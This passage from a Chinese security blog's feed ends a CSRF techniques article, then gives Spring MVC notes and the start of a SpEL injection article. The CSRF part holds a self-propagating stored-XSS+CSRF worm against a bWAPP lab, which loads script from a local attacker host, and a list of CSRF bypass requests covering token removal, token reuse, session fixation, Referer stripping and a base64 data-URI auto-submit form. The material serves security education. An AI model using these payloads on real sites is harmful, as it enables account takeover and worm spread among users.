e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _f = new_form();</span><br><span class="line">create_elements(_f, <span class="string">"entry"</span>, <span class="string">"&lt;script src=\"http://192.168.10.1/csrf2.js\"&gt;&lt;/script&gt;"</span>);</span><br><span class="line">create_elements(_f, <span class="string">"blog"</span>, <span class="string">"submit"</span>);</span><br><span class="line">create_elements(_f, <span class="string">"entry_add"</span>, <span class="string">""</span>);</span><br><span class="line">_f.action = <span class="string">"http://192.168.10.133/bWAPP/xss_stored_1.php"</span></span><br><span class="line">_f.submit();</span><br></pre></td></tr></table></figure><p>将这段JS代码中的一个作为csrf2.js文件，删掉之前alan用户相关的博文，提交博文内容为<code>&lt;script src=&quot;http://192.168.10.1/csrf2.js&quot;&gt;&lt;/script&gt;</code>，即通过script标签直接引入CSRF攻击的JavaScript代码，之后会发现只要有用户访问了这个页面就会一直触发XSS+CSRF蠕虫攻击（因为这个Blog内容是直接显示在主页而无需点进去才能看到内容），每次被攻击的用户都会自动发布一个同样payload的博文继续往下传染蠕虫：</p><p><img src="/2020/01/21/CSRF-Tricks小结/7.png" alt=""></p><p><img src="/2020/01/21/CSRF-Tricks小结/8.png" alt=""></p><p>当其他用户访问就会自动感染蠕虫：</p><p><img src="/2020/01/21/CSRF-Tricks小结/9.png" alt=""></p><h2 id="0x08-CSRF绕过技巧收集"><a href="#0x08-CSRF绕过技巧收集" class="headerlink" title="0x08 CSRF绕过技巧收集"></a>0x08 CSRF绕过技巧收集</h2><p>引自：<a href="https://xz.aliyun.com/t/6176" target="_blank" rel="noopener">绕过CSRF防御</a></p><h3 id="所有的CSRF"><a href="#所有的CSRF" class="headerlink" title="所有的CSRF"></a>所有的CSRF</h3><p>不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。</p><h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</p><h4 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h4><p>另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。</p><p>例如，如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br></pre></td></tr></table></figure><p>可以被改写成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /change_password?new_password=qwerty</span><br></pre></td></tr></table></figure><h3 id="CSRF-token的防御措施"><a href="#CSRF-token的防御措施" class="headerlink" title="CSRF token的防御措施"></a>CSRF token的防御措施</h3><p>因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。</p><h4 id="删除token参数或发送空token"><a href="#删除token参数或发送空token" class="headerlink" title="删除token参数或发送空token"></a>删除token参数或发送空token</h4><p>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p><p>例如，合法请求如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br></pre></td></tr></table></figure><p>那么实施这种请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br></pre></td></tr></table></figure><p>或这种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty&amp;csrf_tok=</span><br></pre></td></tr></table></figure><h4 id="使用另一个session的CSRF-token"><a href="#使用另一个session的CSRF-token" class="headerlink" title="使用另一个session的CSRF token"></a>使用另一个session的CSRF token</h4><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p><p>如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。</p><p>换句话说，原本应该发送如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br></pre></td></tr></table></figure><p>但是改成发送这个请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=YOUR_TOKEN</span><br></pre></td></tr></table></figure><h4 id="Session固定"><a href="#Session固定" class="headerlink" title="Session固定"></a>Session固定</h4><p>有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。</p><p>如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。</p><p>这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。</p><ol><li><p>session固定。这是一个可以让你控制受害者的cookie存储的攻击；</p></li><li><p>执行如下请求来实施CSRF攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">Cookie: CSRF_TOK=FAKE_TOKEN;</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=FAKE_TOKEN</span><br></pre></td></tr></table></figure></li></ol><h3 id="Referer字段的CSRF防御"><a href="#Referer字段的CSRF防御" class="headerlink" title="Referer字段的CSRF防御"></a>Referer字段的CSRF防御</h3><p>如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？</p><h4 id="Referer字段为空"><a href="#Referer字段为空" class="headerlink" title="Referer字段为空"></a>Referer字段为空</h4><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>协议绕过。这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><p><strong>利用data:协议</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Base64解码即可看到代码。</p><p><strong>利用https协议</strong></p><p>https向http跳转的时候Referer为空，拿一个https的webshell</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://xxxxx.xxxxx/attack.php"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>attack.php写上CSRF攻击代码</p><h4 id="移除Referer字段"><a href="#移除Referer字段" class="headerlink" title="移除Referer字段"></a>移除Referer字段</h4><p>和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span> =<span class="string">“referrer”content</span> =<span class="string">“no-referrer”</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。</p><h4 id="绕过正则表达式"><a href="#绕过正则表达式" class="headerlink" title="绕过正则表达式"></a>绕过正则表达式</h4><p>如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。</p><p>如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。</p><h4 id="判断Referer是某域情况下绕过"><a href="#判断Referer是某域情况下绕过" class="headerlink" title="判断Referer是某域情况下绕过"></a>判断Referer是某域情况下绕过</h4><p> 比如你找的csrf是xxx.com验证的referer是验证的*.xx.com可以找个二级域名之后<code>&lt;img &quot;csrf地址&quot;&gt;</code>之后在把文章地址发出去就可以伪造。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSRF" scheme="https://www.mi1k7ea.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>Spring MVC笔记</title>
    <link href="https://www.mi1k7ea.com/2020/01/16/Spring-MVC%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.mi1k7ea.com/2020/01/16/Spring-MVC笔记/</id>
    <published>2020-01-16T14:43:00.000Z</published>
    <updated>2020-02-03T12:33:10.603Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p><a href="http://c.biancheng.net/spring_mvc/" target="_blank" rel="noopener">http://c.biancheng.net/spring_mvc/</a></p><h2 id="0x01-MVC设计模式"><a href="#0x01-MVC设计模式" class="headerlink" title="0x01 MVC设计模式"></a>0x01 MVC设计模式</h2><p>MVC是Model、View和Controller的缩写，分别代表Web应用程序中的三种职责：</p><ul><li>Model模型：用于存储数据以及处理用户请求的业务逻辑。</li><li>View视图：向控制器提交数据，显示模型中的数据。</li><li>Controller控制器：根据视图提出的请求判断将请求和数据交给哪个模型处理，将处理后的有关结果交给哪个视图更新显示。</li></ul><p>MVC设计不仅限于Java Web应用，还包括许多应用，比如前端、PHP、.NET 等语言。之所以那么做的根本原因在于解耦各个模块。</p><p>其中，经典的基于Servlet的MVC模式的具体实现如下：</p><p><img src="/2020/01/16/Spring-MVC笔记/1.png" alt=""></p><ul><li>模型：一个或多个JavaBean对象，用于存储数据（实体模型，由JavaBean类创建）和处理业务逻辑（业务模型，由一般的Java类创建）。</li><li>视图：一个或多个JSP页面，向控制器提交数据和为模型提供数据显示，JSP页面主要使用HTML标记和JavaBean标记来显示数据。</li><li>控制器：一个或多个Servlet对象，根据视图提交的请求进行控制，即将请求转发给处理业务逻辑的JavaBean，并将处理结果存放到实体模型JavaBean中，输出给视图显示。</li></ul><h2 id="0x02-Spring-MVC简介"><a href="#0x02-Spring-MVC简介" class="headerlink" title="0x02 Spring MVC简介"></a>0x02 Spring MVC简介</h2><p>Spring MVC是Spring提供给Web应用的框架设计，是典型的MVC架构。</p><p>Spring MVC框架主要由DispatcherServlet、处理器映射、控制器、视图解析器、视图组成，其工作原理如图：</p><p>…</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>SpEL表达式注入漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/</id>
    <published>2020-01-10T14:05:19.000Z</published>
    <updated>2020-01-14T14:42:03.501Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SpEL表达式基础"><a href="#0x01-SpEL表达式基础" class="headerlink" title="0x01 SpEL表达式基础"></a>0x01 SpEL表达式基础</h2><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p> 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p><p>在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p><p>SpEL有许多特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h3 id="SpEL定界符——"><a href="#SpEL定界符——" class="headerlink" title="SpEL定界符——#{}"></a>SpEL定界符——<code>#{}</code></h3><p>SpEL使用<code>#{}</code>作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p><p>这里需要注意<code>#{}</code>和<code>${}</code>的区别：</p><ul><li><code>#{}</code>就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li><li><code>${}</code>主要用于加载外部属性文件中的值；</li><li>两者可以混合使用，但是必须<code>#{}</code>在外面，<code>${}</code>在里面，如<code>#{&#39;${}&#39;}</code>，注意单引号是字符串类型才添加的；</li></ul><h3 id="SpEL表达式类型"><a href="#SpEL表达式类型" class="headerlink" title="SpEL表达式类型"></a>SpEL表达式类型</h3><h4 id="字面值"><a href="#字面值" class="headerlink" title="字面值"></a>字面值</h4><p>最简单的SpEL表达式就是仅包含一个字面值。</p><p>下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到<code>#{}</code>定界符，注意若是指定为字符串的话需要添加单引号括起来：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message1"</span> <span class="attr">value</span>=<span class="string">"#&#123;666&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message2"</span> <span class="attr">value</span>=<span class="string">"#&#123;'mi1k7ea'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>还可以直接与字符串混用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;property name=&quot;message&quot; value=&quot;the value is #&#123;666&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"salary"</span> <span class="attr">value</span>=<span class="string">"#&#123;1e4&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><p>直接用Spring的HelloWorld例子。</p><p>HelloWorld.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Your Message : "</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        HelloWorld obj = (HelloWorld) context.getBean(<span class="string">"helloWorld"</span>);</span><br><span class="line">        obj.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Beans.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;'mi1k7ea'&#125; is #&#123;666&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Message : mi1k7ea is 666</span><br></pre></td></tr></table></figure><h4 id="引用Bean、属性和方法"><a href="#引用Bean、属性和方法" class="headerlink" title="引用Bean、属性和方法"></a>引用Bean、属性和方法</h4><h5 id="引用Bean"><a href="#引用Bean" class="headerlink" title="引用Bean"></a>引用Bean</h5><p>SpEL表达式能够通过其他Bean的ID进行引用，直接在<code>#{}</code>符号中写入ID名即可，无需添加单引号括起来。如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--原来的写法，通过构造函数实现依赖注入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;constructor-arg ref="test"/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"#&#123;test&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h5 id="引用类属性"><a href="#引用类属性" class="headerlink" title="引用类属性"></a>引用类属性</h5><blockquote><p>SpEL表达式能够访问类的属性。</p><p>比如，carl参赛者是一位模仿高手，kenny唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"kenny"</span> <span class="attr">class</span>=<span class="string">"com.spring.entity.Instrumentalist"</span></span></span><br><span class="line"><span class="tag">&gt;</span>    p:song="May Rain"</span><br><span class="line">&gt;    p:instrument-ref="piano"/&gt;</span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"carl"</span> <span class="attr">class</span>=<span class="string">"com.spring.entity.Instrumentalist"</span>&gt;</span></span><br><span class="line">&gt;    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"instrument"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.instrument&#125;"</span>/&gt;</span></span><br><span class="line">&gt;    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song&#125;"</span>/&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>key指定kenny<code>&lt;bean&gt;</code> 的id，value指定kenny<code>&lt;bean&gt;</code>的song属性。其等价于执行下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;Instrumentalist carl = new Instrumentalist();</span><br><span class="line">&gt;carl.setSong(kenny.getSong());</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h5 id="引用类方法"><a href="#引用类方法" class="headerlink" title="引用类方法"></a>引用类方法</h5><blockquote><p>SpEL表达式还可以访问类的方法。</p><p>假设现在有个SongSelector类，该类有个<code>selectSong()</code>方法，这样的话carl就可以不用模仿别人，开始唱songSelector所选的歌了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>carl有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用<code>toUpperCase()</code>方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong().toUpperCase()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>注意：这里我们不能确保不抛出<code>NullPointerException</code>，为了避免这个讨厌的问题，我们可以使用SpEL的<code>null-safe</code>存取器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong()?.toUpperCase()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>?.</code>符号会确保左边的表达式不会为<code>null</code>，如果为<code>null</code>的话就不会调用<code>toUpperCase()</code>方法了。</p></blockquote><h5 id="Demo——引用Bean"><a href="#Demo——引用Bean" class="headerlink" title="Demo——引用Bean"></a>Demo——引用Bean</h5><p>这里我们修改基于构造函数的依赖注入的示例。</p><p>SpellChecker.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpellChecker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpellChecker</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside SpellChecker constructor."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkSpelling</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside checkSpelling."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TextEditor.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">(SpellChecker spellChecker)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside TextEditor constructor."</span> );</span><br><span class="line">        <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spellCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        spellChecker.checkSpelling();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 